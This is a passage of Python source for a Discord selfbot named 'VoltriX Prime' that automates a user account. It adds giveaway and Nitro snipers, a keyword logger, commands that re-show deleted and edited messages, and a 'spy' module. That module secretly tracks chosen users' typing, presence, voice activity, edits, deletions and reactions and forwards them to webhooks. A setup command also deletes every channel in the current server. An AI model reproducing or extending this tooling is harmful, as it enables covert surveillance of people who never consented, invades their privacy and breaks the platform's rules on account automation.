                                    "value": message.guild.name if message.guild else "Direct Message",
                                    "inline": True
                                },
                                {
                                    "name": "Channel",
                                    "value": message.channel.mention if message.guild else "DM",
                                    "inline": True
                                },
                                {
                                    "name": "Join Method",
                                    "value": "Reaction / Button",
                                    "inline": True
                                },
                                {
                                    "name": "Message",
                                    "value": f"[Jump to Giveaway]({message.jump_url})",
                                    "inline": False
                                }
                            ],
                            "footer": {
                                "text": "VoltriX Prime • Giveaway Sniper"
                            },
                            "timestamp": datetime.utcnow().isoformat()
                        }

                        await session.post(giveaway_webhook, json={"embeds":[embed]})

        # ======================
        # AUTO FORWARD TRIGGER
        # ======================
        if message.author.id == voltrix.user.id:
            msg_content = (message.content or "").lower().strip()
            if msg_content in af_triggers:
                trigger_data = af_triggers[msg_content]
                try:
                    await message.delete()
                except:
                    pass
                
                try:
                    src_chan_id = int(trigger_data["channel_id"])
                    src_msg_id = int(trigger_data["message_id"])
                    src_chan = voltrix.get_channel(src_chan_id) or await voltrix.fetch_channel(src_chan_id)
                    if src_chan:
                        src_msg = await src_chan.fetch_message(src_msg_id)
                        await forward_message(message.channel, src_msg)
                except Exception as af_err:
                    print(f"Failed to auto-forward message: {af_err}")

        # ======================
        # KEYWORD LOGGER
        # ======================
        if (keyword_logger_enabled and keyword_logger_webhook and keyword_logger_keywords
                and message.author.id != voltrix.user.id):
            msg_text = (message.content or "").lower()
            matched_kws = [kw for kw in keyword_logger_keywords if kw.lower() in msg_text]
            if matched_kws:
                try:
                    # Build location info
                    if message.guild:
                        location_type = "Server"
                        location_name = message.guild.name
                        location_icon = str(message.guild.icon_url) if message.guild.icon_url else ""
                        channel_display = f"<#{message.channel.id}> (`#{message.channel.name}`)"
                        channel_link = f"[#{message.channel.name}](https://discord.com/channels/{message.guild.id}/{message.channel.id})"
                        msg_link = f"[Jump to Message]({message.jump_url})"
                        server_display = f"{message.guild.name} (`{message.guild.id}`)"
                    elif isinstance(message.channel, discord.DMChannel):
                        location_type = "Direct Message"
                        location_name = "DM"
                        location_icon = ""
                        channel_display = "Direct Message"
                        channel_link = "Direct Message"
                        msg_link = "*DM — no link*"
                        server_display = "Direct Message"
                    else:
                        location_type = "Group DM"
                        location_name = getattr(message.channel, "name", "Group DM") or "Group DM"
                        location_icon = ""
                        channel_display = location_name
                        channel_link = location_name
                        msg_link = "*Group DM — no link*"
                        server_display = location_name

                    matched_str = ", ".join(f"`{kw}`" for kw in matched_kws)
                    content_preview = (message.content or "*No content*")[:1000]
                    author = message.author
                    ts = int(message.created_at.timestamp())
                    attachments_str = "\n".join(a.url for a in message.attachments) if message.attachments else "None"

                    kw_embed = {
                        "title": "🔍 Keyword Detected",
                        "color": 0xF1C40F,
                        "thumbnail": {"url": str(author.avatar_url) if author.avatar_url else ""},
                        "fields": [
                            {
                                "name": "👤 Author",
                                "value": f"{author.mention}\n`{author.name}#{author.discriminator}` (`{author.id}`)",
                                "inline": True
                            },
                            {
                                "name": "🎯 Matched Keywords",
                                "value": matched_str,
                                "inline": True
                            },
                            {
                                "name": f"📍 {location_type}",
                                "value": server_display,
                                "inline": False
                            },
                            {
                                "name": "📢 Channel",
                                "value": channel_link,
                                "inline": True
                            },
                            {
                                "name": "🕒 Timestamp",
                                "value": f"<t:{ts}:F> (<t:{ts}:R>)",
                                "inline": True
                            },
                            {
                                "name": "💬 Message Content",
                                "value": content_preview,
                                "inline": False
                            },
                            {
                                "name": "🔗 Message Link",
                                "value": msg_link,
                                "inline": False
                            }
                        ],
                        "footer": {
                            "text": f"VoltriX • Keyword Logger | {location_type}",
                            "icon_url": location_icon
                        },
                        "timestamp": message.created_at.isoformat()
                    }

                    if attachments_str != "None":
                        kw_embed["fields"].append({
                            "name": "📎 Attachments",
                            "value": attachments_str[:500],
                            "inline": False
                        })

                    async with aiohttp.ClientSession() as kw_session:
                        await kw_session.post(keyword_logger_webhook, json={"embeds": [kw_embed]})

                except Exception as kw_err:
                    print(f"[Keyword Logger] Error: {kw_err}")

        # ======================
        # AUTO RESPONDER SCANNER
        # ======================
        if message.content:
            try:
                if os.path.exists("database/ar.json"):
                    with open("database/ar.json", "r", encoding="utf-8") as f:
                        ar_data = json.load(f)
                    msg_content = message.content.strip()
                    if msg_content in ar_data:
                        if message.author.id == voltrix.user.id:
                            try:
                                await message.delete()
                            except:
                                pass
                        await message.channel.send(ar_data[msg_content])
                        return  # Stop further processing if auto-response is handled
            except Exception as ar_err:
                print(f"[Auto Responder Scanner] Error: {ar_err}")

        await voltrix.process_commands(message)

    except Exception as e:

        print("[FATAL EVENT ERROR]", e)

async def safe_delete(message):
    try:
        await message.delete()
    except (discord.NotFound, discord.Forbidden):
        pass
        
@voltrix.command(name="help", aliases=["h"])
async def help(ctx, module: str = None):

    modules = [
        "fun", "images", "mods", "alts", "nsfw",
        "text", "wizz", "crypto", "wallet", "checker",
        "activity", "rpc", "user", "config", "gc", "vc",
        "other", "music", "spy", "sniper", "btool", "gw", "copy",
        "anuke", "greet", "autoad", "quests", "vsniper"
    ]

    with open("config.json", "r") as f:
        config = json.load(f)

    prefix = config.get("prefix") or ""
    mode = config.get("mode", 1)
    no_prefix = prefix.strip() == ""
    prefix_text = "`No Prefix Mode`" if no_prefix else f"`{prefix}`"
        
    def cmd(name):
        return f"`{name}`" if no_prefix else f"`{prefix}{name}`"

    if module is None:
        if mode in [2, 4]:
            # Embed mode: header is empty (no embed title), and VoltriX Prime V2 is the first line of description
            header_val = ""
            first_line = "#  __VoltriX Prime V2__ <:ownerr:1539700823817461901>\n"
            prefix_char = "> "
        else:
            # Non-embed modes: header is the VoltriX title, description lines do not need the > prefix (avoiding duplicate > within blockquote)
            header_val = "__VoltriX Prime V2__ <:ownerr:1539700823817461901>"
            first_line = ""
            prefix_char = ""

        description = (
            f"{first_line}"
            f"<:BadgeDeveloper:1290693804013129768> **All-In-One Self Automation** <:FL_blue_gengar:1281973618632429710> \n"
            f"<:blue_arrow:1282007042072252498>**Hey, {ctx.author.name}** I'm here to help You\n\n"
            f"<:emoji_1738342244745:1334928872269152259> **HELP:** {prefix}h <module name>\n"
            f"<:emoji_1739864210539:1341312459507499100> **Commands Loaded:** `{len(list(voltrix.walk_commands()))}`\n"
            f"<:emoji_1739864210539:1341312459507499100> **Categories Loaded:** `27`\n\n"
            f"<:MekoCategory:1539698164146376802>**__Module Categories__**\n"
            f"{prefix_char}<a:LaughtPepe:1281243496136573011> **FUN** → `{prefix}help fun`\n"
            f"{prefix_char}<:sparkles_discord_nitro:1479808795898020012> **SNIPER** → `{prefix}help sniper`\n"
            f"{prefix_char}<a:BlueZap:1495689384974876763> **SPY** → `{prefix}help spy`\n"
            f"{prefix_char}<a:butterfly_blue:1281973623737024553> **IMAGES** → `{prefix}help images`\n"
            f"{prefix_char}<a:Bot:1336670517486161951> **MODS** → `{prefix}help mods`\n"
            f"{prefix_char}<:discord:1282007043456241717> **ALTS** → `{prefix}help alts`\n"
            f"{prefix_char}<:tharkimon:1291420565911113809> **NSFW** → `{prefix}help nsfw`\n"
            f"{prefix_char}<:bxbz_monet_lovenote:1290693793724497920> **TEXT** → `{prefix}help text`\n"
            f"{prefix_char}<a:Nuking_Residence:1308833239670198314> **WIZZ** → `{prefix}help wizz`\n"
            f"{prefix_char}<:exchanger:1322954180452810775> **CRYPTO** → `{prefix}help crypto`\n"
            f"{prefix_char}<:LTC:1322611807269031968> **WALLET** → `{prefix}help wallet`\n"
            f"{prefix_char}<:Titanz:1281243485919510569> **CHECKER** → `{prefix}help checker`\n"
            f"{prefix_char}<:IconStatusWebOnline:1349022132251656232> **ACTIVITY** → `{prefix}help activity`\n"
            f"{prefix_char}<a:Xieron_stolen_emoji_1787131712:1539566733046718495> **RPC** → `{prefix}help rpc`\n"
            f"{prefix_char}<:Discord_bots:1290700055514452121> **USER** → `{prefix}help user`\n"
            f"{prefix_char}<:Settings:1290692093001469994> **CONFIG** → `{prefix}help config`\n"
            f"{prefix_char}<:OwnerSpecial:1290692086122680321> **GROUP CHAT** → `{prefix}help gc`\n"
            f"{prefix_char}<:rd_VoiceIcon:1321112732770238545> **VOICE CHANNEL** → `{prefix}help vc`\n"
            f"{prefix_char}<:exchange:1325732637821898795> **MUSIC** → `{prefix}help music`\n"
            f"{prefix_char}<:emoji_1738476603350:1335492413153742961> **BOOST TOOL** → `{prefix}help btool`\n"
            f"{prefix_char}<a:yeah:1281246694352093315> **GIVEAWAY** → `{prefix}help gw`\n"
            f"{prefix_char}<a:FF_aes_blueflower:1281973616606449717> **GREET** → `{prefix}help greet`\n"
            f"{prefix_char}<:botupdate:1290700047629160508> **COPY** → `{prefix}help copy`\n"
            f"{prefix_char}<:TOS:1336669803221614622> **ANTINUKE** → `{prefix}help anuke`\n"
            f"{prefix_char}<:Titanz:1281243482811400324> **AUTO ADS** → `{prefix}help autoad`\n"
            f"{prefix_char}<:quest:1533405689706446908> **QUESTS** → `{prefix}help quests`\n"
            f"{prefix_char}<:kronix_partner:1290692094884577374> **VANITY SNIPER** → `{prefix}help vsniper`\n"
            f"{prefix_char}<a:exc:1325375984509128754> **OTHER** → `{prefix}help other`\n\n"
            f"{prefix_char}<a:emoji_1739864216072:1341312482672640041> **View Everything:** `{prefix}allcmds`\n"
            f"{prefix_char}<a:emoji_1739864216072:1341312482672640041> **Support:** `.gg/synthex`"
        )

        await send(
            ctx,
            header_val,
            description,
            image="https://cdn.discordapp.com/attachments/1533387850383491112/1539695709014728754/C0720315-1FA9-4EA1-8CC3-CD56D6019540.png?ex=6a8740df&is=6a85ef5f&hm=2574e2fe9e6db53baa52009c4927dc905150024efe6138764d55360bbdde6fca"
        )
        return

    module = module.lower()

    if module in modules:
        command = voltrix.get_command(module)
        if command:
            await ctx.invoke(command)
        else:
            await send(ctx, "Error", f"No commands found for `{module}`.")
    else:
        await send(ctx, "Module Not Found", f"Use {cmd('help')} to see modules.")
        
@voltrix.command()
async def nitro_sniper(ctx, state: str):

    global nitro_sniper_enabled

    await ctx.message.delete()

    state = state.lower()

    if state not in ["enable", "disable"]:
        return await send(ctx, "Nitro Sniper", "Usage: `.nitro_sniper <enable/disable>`")

    nitro_sniper_enabled = state == "enable"

    config["nitro_sniper_enabled"] = nitro_sniper_enabled
    save_config()

    await send(ctx, "Nitro Sniper", f"Nitro sniper **{state}d**.")
    
@voltrix.command()
async def nsniper_webhook(ctx, url: str):

    global nitro_webhook

    await ctx.message.delete()

    nitro_webhook = url

    config["nitro_webhook"] = url
    save_config()

    await send(ctx, "Nitro Sniper", "Nitro webhook updated.") 
    
@voltrix.command()
async def gwy_sniper(ctx, state: str):

    global giveaway_sniper_enabled

    await ctx.message.delete()

    state = state.lower()

    if state not in ["enable", "disable"]:
        return await send(ctx, "Giveaway Sniper", "Usage: `.gwy_sniper <enable/disable>`")

    giveaway_sniper_enabled = state == "enable"

    config["giveaway_sniper_enabled"] = giveaway_sniper_enabled
    save_config()

    await send(ctx, "Giveaway Sniper", f"Giveaway sniper **{state}d**.")
    
@voltrix.command()
async def gsniper_webhook(ctx, url: str):

    global giveaway_webhook

    await ctx.message.delete()

    giveaway_webhook = url

    config["giveaway_webhook"] = url
    save_config()

    await send(ctx, "Giveaway Sniper", "Giveaway webhook updated.")
               
@voltrix.command(name="allcmds", aliases=["cmds"])
async def allcmds(ctx):
    await ctx.message.delete()

    cmds = sorted([command.name for command in voltrix.commands])
    total = len(cmds)

    # Format commands in rows of 4
    formatted = []
    row = []

    for cmd in cmds:
        row.append(f"`{cmd}`")
        if len(row) == 4:
            formatted.append("  ".join(row))
            row = []

    if row:
        formatted.append("  ".join(row))

    chunks = []
    current_chunk = ""

    for line in formatted:
        if len(current_chunk) + len(line) > 1700:
            chunks.append(current_chunk)
            current_chunk = ""
        current_chunk += line + "\n"

    if current_chunk:
        chunks.append(current_chunk)

    for i, chunk in enumerate(chunks, 1):
        content = (
            f"<a:Bot:1336670517486161951>  **__COMMAND DIRECTORY__**  <a:Bot:1336670517486161951>\n\n"
            f"<:FL_blue_gengar:1281973618632429710> Total Commands: `{total}`\n"
            f"<:Settings:1290692093001469994> Page: `{i}/{len(chunks)}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{chunk}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )

        await ctx.send(content)

@voltrix.command()
async def snipe(ctx):

    await ctx.message.delete()

    messages = snipe_cache.get(ctx.channel.id, [])

    if not messages:
        return await send(ctx, "No Message to Snipe", "No recently deleted messages.")

    msg = messages[-1]

    author = msg["author"]
    content = msg["content"] or "*No content*"
    files = msg["files"]
    time = msg["time"]

    file_text = "\n".join(files) if files else "None"

    desc = (
        f"**User:** {author.mention} (`{author.id}`)\n"
        f"**Time:** `{time}`\n"
        f"**Content:** {content}\n"
        f"**Attachments:** {file_text}"
    )

    await send(ctx, f"{author} deleted a message", desc)
    
@voltrix.command()
async def snipeall(ctx):

    await ctx.message.delete()

    messages = snipe_cache.get(ctx.channel.id, [])

    if not messages:
        return await send(ctx, "Message Snipe", "No deleted messages.")

    for msg in messages[-10:]:

        author = msg["author"]
        content = msg["content"] or "*No content*"
        files = msg["files"]
        time = msg["time"]

        file_text = "\n".join(files) if files else "None"

        desc = (
            f"**User:** {author.mention} (`{author.id}`)\n"
            f"**Time:** `{time}`\n"
            f"**Content:** {content}\n"
            f"**Attachments:** {file_text}"
        )

        await send(ctx, f"{author} deleted a message", desc)
        
@voltrix.command()
async def esnipe(ctx):

    await ctx.message.delete()

    edits = sniped_edits.get(ctx.channel.id, [])

    if not edits:
        return await send(ctx, "Edit Snipe", "No edited messages.")

    msg = edits.pop()

    author = msg["author"]
    before = msg["before"]
    after = msg["after"]

    before_files = "\n".join(msg["before_files"]) if msg["before_files"] else "None"
    after_files = "\n".join(msg["after_files"]) if msg["after_files"] else "None"

    desc = (
        f"**User:** {author.mention} (`{author.id}`)\n\n"
        f"**Before:** {before}\n"
        f"**After:** {after}\n\n"
        f"**Attachments Before:** {before_files}\n"
        f"**Attachments After:** {after_files}"
    )

    await send(ctx, "Message Edit Snipe", desc)
    
@voltrix.command()
async def esnipeall(ctx):

    await ctx.message.delete()

    edits = sniped_edits.get(ctx.channel.id, [])

    if not edits:
        return await send(ctx, "Edit Snipe", "No edited messages.")

    for msg in edits[-10:]:

        author = msg["author"]
        before = msg["before"]
        after = msg["after"]

        before_files = "\n".join(msg["before_files"]) if msg["before_files"] else "None"
        after_files = "\n".join(msg["after_files"]) if msg["after_files"] else "None"

        desc = (
            f"**User:** {author.mention} (`{author.id}`)\n\n"
            f"**Before:** {before}\n"
            f"**After:** {after}\n\n"
            f"**Attachments Before:** {before_files}\n"
            f"**Attachments After:** {after_files}"
        )

        await send(ctx, "Message Edit Snipe", desc)
        
@voltrix.command()
async def deleted_logs(ctx, state: str):

    await ctx.message.delete()

    if not config.get("deleted_msg_webhook"):
        return await send(ctx, "Deleted Logs", "Setup not found. Run `.setup` first.")

    state = state.lower()

    if state not in ["enable", "disable"]:
        return await send(ctx, "Deleted Logs", "Usage: `.deleted_logs <enable/disable>`")

    enabled = state == "enable"

    config["deleted_msg_logs"] = enabled
    save_config()

    status = "Enabled" if enabled else "Disabled"

    await send(ctx, "Deleted Message Logs", f"Logging **{status}**.")
    
@voltrix.command()
async def edited_logs(ctx, state: str):

    await ctx.message.delete()

    if not config.get("edited_msg_webhook"):
        return await send(ctx, "Edited Logs", "Setup not found. Run `.setup` first.")

    state = state.lower()

    if state not in ["enable", "disable"]:
        return await send(ctx, "Edited Logs", "Usage: `.edited_logs <enable/disable>`")

    enabled = state == "enable"

    config["edited_msg_logs"] = enabled
    save_config()

    status = "Enabled" if enabled else "Disabled"

    await send(ctx, "Edited Message Logs", f"Logging **{status}**.")
    
@voltrix.command()
async def setup(ctx):

    global config
    global spy_config

    config = load_config()
    spy_config = load_spy_data()

    # delete channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except:
            pass

    await ctx.guild.edit(name=f"{selfbot_name} Setup")

    category = await ctx.guild.create_category(f"{selfbot_name} setup")

    ping_channel = await ctx.guild.create_text_channel("ping-scan", category=category)
    embed_channel = await ctx.guild.create_text_channel("embed-mode", category=category)
    wallets_channel = await ctx.guild.create_text_channel("wallets", category=category)

    boost_log_channel = await ctx.guild.create_text_channel("boost-logs", category=category)
    oauth_boost_log_channel = await ctx.guild.create_text_channel("oauth-boost-logs", category=category)
    commands_log_channel = await ctx.guild.create_text_channel("commands-logs", category=category)

    deleted_logs_channel = await ctx.guild.create_text_channel("deleted-logs", category=category)
    edited_logs_channel = await ctx.guild.create_text_channel("edited-logs", category=category)
    spy_logs_channel = await ctx.guild.create_text_channel("spy-logs", category=category)

    nitro_logs_channel = await ctx.guild.create_text_channel("nitro-sniper-logs", category=category)
    giveaway_logs_channel = await ctx.guild.create_text_channel("giveaway-sniper-logs", category=category)

    ping_webhook = await ping_channel.create_webhook(name="Ping Scan Webhook")
    embed_webhook = await embed_channel.create_webhook(name="Embed Mode Webhook")
    wallets_webhook = await wallets_channel.create_webhook(name="Wallets Webhook")

    boost_logs_webhook = await boost_log_channel.create_webhook(name="Boost Logs Webhook")
    oauth_boost_webhook = await oauth_boost_log_channel.create_webhook(name="OAuth Boost Logs Webhook")
    commands_webhook = await commands_log_channel.create_webhook(name="Commands Logs Webhook")

    deleted_logs_webhook = await deleted_logs_channel.create_webhook(name="Deleted Message Logs")
    edited_logs_webhook = await edited_logs_channel.create_webhook(name="Edited Message Logs")
    spy_logs_webhook = await spy_logs_channel.create_webhook(name="Spy Logs Webhook")

    nitro_sniper_webhook = await nitro_logs_channel.create_webhook(name="Nitro Sniper Logs")
    giveaway_sniper_webhook = await giveaway_logs_channel.create_webhook(name="Giveaway Sniper Logs")

    config["boosting_logs_webhook_url"] = boost_logs_webhook.url
    config["oauth_boosting_logs_webhook_url"] = oauth_boost_webhook.url
    config["commands_logs_webhook_url"] = commands_webhook.url

    config["ping_scan_webhook_url"] = ping_webhook.url
    config["embed_mode_webhook_url"] = embed_webhook.url
    config["wallets_webhook_url"] = wallets_webhook.url

    config["deleted_msg_webhook"] = deleted_logs_webhook.url
    config["edited_msg_webhook"] = edited_logs_webhook.url

    config["nitro_webhook"] = nitro_sniper_webhook.url
    config["giveaway_webhook"] = giveaway_sniper_webhook.url

    config["deleted_msg_logs"] = False
    config["edited_msg_logs"] = False
    config["nitro_sniper_enabled"] = False
    config["giveaway_sniper_enabled"] = False

    save_config()

    spy_config["spy_webhook"] = spy_logs_webhook.url
    save_spy_data(spy_config)

    await ctx.send("Setup complete.")


@voltrix.command()
async def info(ctx):
    try:
        await ctx.message.delete()
    except:
        pass

    with open('config.json', 'r') as config_file:
        config = json.load(config_file)

    prefix = config.get("prefix") or ""
    bot_prefix = prefix if prefix.strip() != "" else "No Prefix Mode Enabled"

    commands_list = [command.name for command in voltrix.commands]
    commands_count = len(commands_list)

    latency = round(voltrix.latency * 1000)
    user = voltrix.user

    created_at = user.created_at.strftime("%d %B %Y")
    guilds = len(voltrix.guilds)

    description = (
        f"<a:emoji_1739864737772:1341314670346371095>" * 12 + "\n"
        f"<:BadgeDeveloper:1290693804013129768>  **__VOLTRIX SELF SYSTEM__**  <a:Bot:1336670517486161951>\n"

        f"<:blue_arrow:1282007042072252498>  **Connected Account**  :  `{user.name}`\n"
        f"<:blue_arrow:1282007042072252498>  **User ID**           :  `{user.id}`\n"
        f"<:blue_arrow:1282007042072252498>  **Account Created**   :  `{created_at}`\n"
        f"<:blue_arrow:1282007042072252498>  **Servers Connected** :  `{guilds}`\n\n"

        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        f"<:blue_arrow:1282007042072252498>  **Selfbot Name**       :  `{selfbot_name}`\n"
        f"<:blue_arrow:1282007042072252498>  **Total Commands**     :  `{commands_count}`\n"
        f"<:blue_arrow:1282007042072252498>  **Current Ping**       :  `{latency} ms`\n"
        f"<:blue_arrow:1282007042072252498>  **Prefix Mode**        :  `{bot_prefix}`\n\n"

        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        f"<:blue_arrow:1282007042072252498>  **Language**           :  `Python`\n"
        f"<:blue_arrow:1282007042072252498>  **Framework**          :  `discord.py-self`\n"
        f"<:blue_arrow:1282007042072252498>  **Version**            :  `V1`\n"
        f"<:blue_arrow:1282007042072252498>  **Developer**          :  `wtf.siddhu`\n\n"

        f"<a:Bot:1336670517486161951>  **Premium Automation Engine Loaded Successfully**"
    )

    await send(
        ctx,
        f"<:devs:1290693770567749652>  __{selfbot_name} System Info__  <:Titanz:1281243489635405827>",
        description,
        thumbnail=user.avatar.url if user.avatar else None
    )
    

import discord
from discord.ext import commands
import json
import requests
from datetime import datetime

previous_presence = {}

# =========================
# LOAD / SAVE
# =========================

def load_spy_data():
    try:
        with open("database/spy.json", "r") as f:
            return json.load(f)
    except:
        return {"spy_webhook": "", "spy_data": {}}

def save_spy_data(data):
    with open("database/spy.json", "w") as f:
        json.dump(data, f, indent=4)

spy_config = load_spy_data()


# =========================
# WEBHOOK LOGGER
# =========================

def log_spy(user, title, desc):

    webhook = spy_config.get("spy_webhook")
    if not webhook:
        return

    embed = {
        "title": f"🔎 {title}",
        "description": f"👤 **User:** {user} (`{user.id}`)\n{desc}",
        "color": 3447003,
        "footer": {"text": f"Voltrix Spy • {datetime.now()}"}
    }

    requests.post(webhook, json={"embeds":[embed]})


def spying(user_id):
    return str(user_id) in spy_config["spy_data"]
@voltrix.event
async def on_guild_join(guild):

    if spying(voltrix.user.id):

        log_spy(voltrix.user,"Joined Server",guild.name)


@voltrix.event
async def on_guild_remove(guild):

    if spying(voltrix.user.id):

        log_spy(voltrix.user,"Left Server",guild.name)
        
@voltrix.event
async def on_group_join(channel, user):

    if spying(user.id):

        log_spy(user,"Joined Group DM",channel.name)


@voltrix.event
async def on_group_remove(channel, user):
    if spying(user.id):
        log_spy(user,"Left Group DM",channel.name)

    if user.id in noLeave:
        try:
            await channel.add_recipient(user)
        except Exception as e:
            print(f"Failed to re-add user {user.name} to group DM: {e}")
                    
@voltrix.event
async def on_guild_channel_create(channel):
    if isinstance(channel, discord.TextChannel):
        category_id = channel.category_id
        if category_id in active_tasks and active_tasks[category_id]:
            delay = message_delays.get(category_id, 1)
            await asyncio.sleep(delay)
            try:
                await channel.send(category_messages[category_id])
            except Exception as e:
                print(f"Failed to send category message: {e}")

@voltrix.event
async def on_message_edit(before, after):

    if before.author.bot:
        return

    if before.content == after.content and before.attachments == after.attachments:
        return

    # ======================
    # SPY LOGGER
    # ======================
    if spying(before.author.id):
        before_files = "\n".join(a.url for a in before.attachments) if before.attachments else "None"
        after_files = "\n".join(a.url for a in after.attachments) if after.attachments else "None"

        log_spy(
            before.author,
            "Message Edited",
            f"Channel: {getattr(before.channel, 'mention', 'DM')}\n"
            f"Before: {before.content or 'None'}\n"
            f"After: {after.content or 'None'}\n"
            f"Attachments Before: {before_files}\n"
            f"Attachments After: {after_files}\n"
            f"Message: {after.jump_url}"
        )

    channel_id = before.channel.id

    if channel_id not in sniped_edits:
        sniped_edits[channel_id] = []

    before_content = before.content or "*No content*"
    after_content = after.content or "*No content*"

    before_files = [a.url for a in before.attachments]
    after_files = [a.url for a in after.attachments]

    sniped_edits[channel_id].append({
        "author": before.author,
        "before": before_content,
        "after": after_content,
        "before_files": before_files,
        "after_files": after_files,
        "time": datetime.now()
    })

    if len(sniped_edits[channel_id]) > 5:
        sniped_edits[channel_id].pop(0)

    if not config.get("edited_msg_logs"):
        return

    files_before = "\n".join(before_files) if before_files else "None"
    files_after = "\n".join(after_files) if after_files else "None"

    if before.guild:
        server_name = before.guild.name
        channel_name = before.channel.mention
    else:
        server_name = "None"
        channel_name = getattr(before.channel, "name", "DM")

    embed = {
        "title": "✏️ Message Edited",
        "color": 16753920,
        "fields": [
            {
                "name": "User",
                "value": f"{before.author.mention}\n`{before.author.id}`",
                "inline": False
            },
            {
                "name": "Channel",
                "value": str(channel_name),
                "inline": False
            },
            {
                "name": "Server",
                "value": str(server_name),
                "inline": False
            },
            {
                "name": "Before",
                "value": before_content[:1000],
                "inline": False
            },
            {
                "name": "After",
                "value": after_content[:1000],
                "inline": False
            },
            {
                "name": "Attachments Before",
                "value": files_before[:1000],
                "inline": False
            },
            {
                "name": "Attachments After",
                "value": files_after[:1000],
                "inline": False
            },
            {
                "name": "Message",
                "value": f"[Jump to Message]({after.jump_url})",
                "inline": False
            }
        ],
        "footer": {
            "text": str(datetime.now())
        }
    }

    try:
        requests.post(config["edited_msg_webhook"], json={"embeds": [embed]})
    except Exception as e:
        print("Edit log error:", e)
        
@voltrix.event
async def on_message_delete(message):

    if message.author.bot:
        return

    if message.author.id == voltrix.user.id:
        return

    # ======================
    # SPY LOGGER
    # ======================
    if spying(message.author.id):
        attachments = "\n".join(a.url for a in message.attachments) if message.attachments else "None"

        log_spy(
            message.author,
            "Message Deleted",
            f"Channel: {getattr(message.channel, 'mention', 'DM')}\n"
            f"Content: {message.content or 'None'}\n"
            f"Attachments: {attachments}"
        )

    channel_id = message.channel.id

    if channel_id not in snipe_cache:
        snipe_cache[channel_id] = []

    files = [a.url for a in message.attachments]

    snipe_cache[channel_id].append({
        "author": message.author,
        "content": message.content,
        "files": files,
        "time": message.created_at
    })

    if len(snipe_cache[channel_id]) > 5:
        snipe_cache[channel_id].pop(0)

    if not config.get("deleted_msg_logs"):
        return

    file_text = "\n".join(files) if files else "None"

    if message.guild:
        server_name = message.guild.name
        channel_name = message.channel.mention
    else:
        server_name = "None"
        channel_name = getattr(message.channel, "name", "DM")

    embed = {
        "title": "🗑 Message Deleted",
        "color": 15158332,
        "fields": [
            {
                "name": "User",
                "value": f"{message.author.mention}\n`{message.author.id}`",
                "inline": False
            },
            {
                "name": "Channel",
                "value": str(channel_name),
                "inline": False
            },
            {
                "name": "Server",
                "value": str(server_name),
                "inline": False
            },
            {
                "name": "Content",
                "value": message.content[:1000] if message.content else "*No content*",
                "inline": False
            },
            {
                "name": "Attachments",
                "value": file_text[:1000],
                "inline": False
            },
            {
                "name": "Timestamp",
                "value": str(message.created_at),
                "inline": False
            }
        ]
    }

    try:
        requests.post(config["deleted_msg_webhook"], json={"embeds": [embed]})
    except Exception as e:
        print("Delete log error:", e)
        
# =========================
# REACTIONS
# =========================

@voltrix.event
async def on_reaction_add(reaction, user):

    if spying(user.id):

        log_spy(
            user,
            "Reaction Added",
            f"Emoji: {reaction.emoji}\n"
            f"Message: {reaction.message.jump_url}"
        )


@voltrix.event
async def on_reaction_remove(reaction, user):

    if spying(user.id):

        log_spy(
            user,
            "Reaction Removed",
            f"Emoji: {reaction.emoji}\n"
            f"Message: {reaction.message.jump_url}"
        )


# =========================
# TYPING
# =========================

typing_cache = {}

@voltrix.event
async def on_typing(channel, user, when):

    if not spying(user.id):
        return

    channel_id = channel.id
    user_id = user.id

    now = datetime.now().timestamp()

    if user_id not in typing_cache:
        typing_cache[user_id] = {}

    last_time = typing_cache[user_id].get(channel_id, 0)

    if now - last_time < 60:
        return

    typing_cache[user_id][channel_id] = now

    loc = "DM"
    if hasattr(channel, "mention"):
        loc = channel.mention

    log_spy(
        user,
        "Typing",
        f"⌨️ Channel: {loc}\nTime: {when}"
    )

# =========================
# USER UPDATE
# =========================
                
@voltrix.event
async def on_user_update(before, after):

    if spying(after.id):

        if before.name != after.name:

            log_spy(
                after,
                "Username Changed",
                f"{before.name} → {after.name}"
            )

        if before.avatar != after.avatar:

            log_spy(
                after,
                "Avatar Changed",
                "User updated avatar"
            )


# =========================
# MEMBER UPDATE
# =========================

@voltrix.event
async def on_member_update(before, after):

    if not spying(after.id):
        return

    if before.premium_since != after.premium_since:
        if after.premium_since:
            log_spy(after, "Server Boosted", f"Server: {after.guild.name}")
        else:
            log_spy(after, "Boost Removed", f"Server: {after.guild.name}")

    if before.nick != after.nick:
        log_spy(after, "Nickname Changed", f"{before.nick} → {after.nick}")

    if before.roles != after.roles:
        log_spy(after, "Roles Changed", "User roles updated")


# =========================
# PRESENCE
# =========================

@voltrix.event
async def on_presence_update(before, after):

    if spying(after.id):

        if before.status != after.status:

            log_spy(
                after,
                "Status Changed",
                f"{before.status} → {after.status}"
            )

        prev = previous_presence.get(after.id)
        current = after.activity

        if prev != current:

            if current:

                log_spy(
                    after,
                    "Activity",
                    f"{current.type} {current.name}"
                )

            else:

                log_spy(
                    after,
                    "Activity Ended",
                    "User stopped activity"
                )

        previous_presence[after.id] = current


# =========================
# VOICE
# =========================

@voltrix.event
async def on_voice_state_update(member, before, after):

    if spying(member.id):

        if before.channel != after.channel:

            if after.channel:

                log_spy(
                    member,
                    "Voice Join",
                    after.channel.name
                )

            if before.channel:

                log_spy(
                    member,
                    "Voice Leave",
                    before.channel.name
                )

        if before.self_mute != after.self_mute:

            log_spy(member,"Mute Toggle",str(after.self_mute))

        if before.self_deaf != after.self_deaf:

            log_spy(member,"Deafen Toggle",str(after.self_deaf))

        if before.self_stream != after.self_stream:

            log_spy(member,"Streaming",str(after.self_stream))

        if before.self_video != after.self_video:

            log_spy(member,"Camera Toggle",str(after.self_video))


# =========================
# COMMANDS
# =========================

@voltrix.command()
async def spy_webhook(ctx,url:str):

    await ctx.message.delete()

    spy_config["spy_webhook"]=url
    save_spy_data(spy_config)

    await ctx.send("Webhook configured")


@voltrix.command()
async def spy_user(ctx,user:discord.Member):

    await ctx.message.delete()

    if not spy_config["spy_webhook"]:
        return await ctx.send("Set webhook first")

    spy_config["spy_data"][str(user.id)]={"username":str(user)}

    save_spy_data(spy_config)

    await ctx.send(f"Now spying {user}")


@voltrix.command()
async def close_spy(ctx,user:discord.Member):

    await ctx.message.delete()

    if str(user.id) in spy_config["spy_data"]:

        del spy_config["spy_data"][str(user.id)]

